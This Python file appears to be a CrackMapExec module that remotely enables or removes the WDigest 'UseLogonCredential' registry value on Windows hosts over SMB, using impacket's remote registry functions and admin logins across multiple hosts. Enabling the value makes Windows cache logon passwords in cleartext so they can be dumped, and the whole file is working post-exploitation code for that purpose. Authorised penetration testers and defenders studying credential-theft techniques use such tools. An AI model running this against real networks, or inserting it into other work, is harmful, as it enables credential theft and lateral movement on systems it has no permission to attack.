from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from sys import exit

class CMEModule:

    name = 'wdigest'
    description = "Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            ACTION  Create/Delete the registry key (choices: enable, disable)
        '''

        if not 'ACTION' in module_options:
            context.log.error('ACTION option not specified!')
            exit(1)

        if module_options['ACTION'].lower() not in ['enable', 'disable']:
            context.log.error('Invalid value for ACTION option!')
            exit(1)

        self.action = module_options['ACTION'].lower()

    def on_admin_login(self, context, connection):
        if self.action == 'enable':
            self.wdigest_enable(context, connection.conn)
        elif self.action == 'disable':
            self.wdigest_disable(context, connection.conn)

    def wdigest_enable(self, context, smbconnection):
        remoteOps = RemoteOperations(smbconnection, False)
        remoteOps.enableRegistry()

        if remoteOps._RemoteOperations__rrp:
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans['phKey']

            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
            keyHandle = ans['phkResult']

            rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00',  rrp.REG_DWORD, 1)

            rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')

            if int(data) == 1:
                context.log.success('UseLogonCredential registry key created successfully')

        try:
            remoteOps.finish()
        except:
            pass

    def wdigest_disable(self, context, smbconnection):
        remoteOps = RemoteOperations(smbconnection, False)
        remoteOps.enableRegistry()

        if remoteOps._RemoteOperations__rrp:
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans['phKey']

            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
            keyHandle = ans['phkResult']

            try:
                rrp.hBaseRegDeleteValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')
            except:
                context.log.success('UseLogonCredential registry key not present')

                try:
                    remoteOps.finish()
                except:
                    pass

                return

            try:
                #Check to make sure the reg key is actually deleted
                rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')
            except DCERPCException:
                context.log.success('UseLogonCredential registry key deleted successfully')
                
                try:
                    remoteOps.finish()
                except:
                    pass

